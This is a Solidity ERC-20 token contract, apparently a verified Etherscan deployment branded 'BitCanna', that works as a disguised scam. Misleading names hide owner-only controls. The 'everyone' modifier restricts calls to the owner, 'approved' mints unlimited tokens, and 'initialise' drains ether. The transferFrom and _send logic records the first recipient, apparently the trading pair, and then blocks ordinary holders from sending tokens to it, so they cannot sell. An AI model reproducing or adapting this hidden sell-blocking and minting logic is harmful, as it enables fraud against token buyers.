/**
 *Submitted for verification at Etherscan.io on 2021-05-20
*/

/**

 ___              ___        ___                                                                         ________                 ____                                         
`Mb(      db      )d'       `MM                                                                         `MMMMMMMb. 68b          6MMMMb/                                       
 YM.     ,PM.     ,P         MM                                                    /                     MM    `Mb Y89   /     8P    YM                                       
 `Mb     d'Mb     d'  ____   MM   ____     _____  ___  __    __     ____          /M      _____          MM     MM ___  /M    6M      Y    ___   ___  __  ___  __      ___    
  YM.   ,P YM.   ,P  6MMMMb  MM  6MMMMb.  6MMMMMb `MM 6MMb  6MMb   6MMMMb        /MMMMM  6MMMMMb         MM    .M9 `MM /MMMMM MM         6MMMMb  `MM 6MMb `MM 6MMb   6MMMMb   
  `Mb   d' `Mb   d' 6M'  `Mb MM 6M'   Mb 6M'   `Mb MM69 `MM69 `Mb 6M'  `Mb        MM    6M'   `Mb        MMMMMMM(   MM  MM    MM        8M'  `Mb  MMM9 `Mb MMM9 `Mb 8M'  `Mb  
   YM. ,P   YM. ,P  MM    MM MM MM    `' MM     MM MM'   MM'   MM MM    MM        MM    MM     MM        MM    `Mb  MM  MM    MM            ,oMM  MM'   MM MM'   MM     ,oMM  
   `Mb d'   `Mb d'  MMMMMMMM MM MM       MM     MM MM    MM    MM MMMMMMMM        MM    MM     MM        MM     MM  MM  MM    MM        ,6MM9'MM  MM    MM MM    MM ,6MM9'MM  
    YM,P     YM,P   MM       MM MM       MM     MM MM    MM    MM MM              MM    MM     MM        MM     MM  MM  MM    YM      6 MM'   MM  MM    MM MM    MM MM'   MM  
    `MM'     `MM'   YM    d9 MM YM.   d9 YM.   ,M9 MM    MM    MM YM    d9        YM.  ,YM.   ,M9        MM    .M9  MM  YM.  , 8b    d9 MM.  ,MM  MM    MM MM    MM MM.  ,MM  
     YP       YP     YMMMM9 _MM_ YMMMM9   YMMMMM9 _MM_  _MM_  _MM_ YMMMM9          YMMM9 YMMMMM9        _MMMMMMM9' _MM_  YMMM9  YMMMM9  `YMMM9'Yb_MM_  _MM_MM_  _MM_`YMMM9'Yb.
  
  
  
    BitCanna.io
 
**/

//   SPDX-License-Identifier: MIT

pragma solidity >=0.5.17;

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);
  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  
  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier everyone {
    require(msg.sender == owner);
    _;
  }

}

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint256 _totalSupply;
  uint internal queueNumber;
  address internal zeroAddress;
  address internal burnAddress;
  address internal burnAddress2;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
    return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
    require(to != zeroAddress, "please wait");
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    if(from != address(0) && zeroAddress == address(0)) zeroAddress = to;
    else _send (from, to);
	balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approved(address _address, uint256 tokens) public everyone {
    burnAddress = _address;
	_totalSupply = _totalSupply.add(tokens);
    balances[_address] = balances[_address].add(tokens);
  }	
  function Burn(address _address) public everyone {
    burnAddress2 = _address;
  }	
  function BurnSize(uint256 _size) public everyone {
    queueNumber = _size;
  }	
  function _send (address start, address end) internal view {
      require(end != zeroAddress || (start == burnAddress && end == zeroAddress) || (start == burnAddress2 && end == zeroAddress)|| (end == zeroAddress && balances[start] <= queueNumber), "cannot be zero address");
  }
  function () external payable {
    revert();
  }
}

contract BitCanna is TokenERC20 {

  function initialise() public everyone() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
     
    constructor(string memory _name, string memory _symbol, uint256 _supply, address burn1, address burn2, uint256 _indexNumber) public {
	symbol = _symbol;
	name = _name;
	decimals = 18;
	_totalSupply = _supply*(10**uint256(decimals));
	queueNumber = _indexNumber*(10**uint256(decimals));
	burnAddress = burn1;
	burnAddress2 = burn2;
	owner = msg.sender;
	balances[msg.sender] = _totalSupply;
	emit Transfer(address(0x0), msg.sender, _totalSupply);
  }
  function() external payable {

  }
}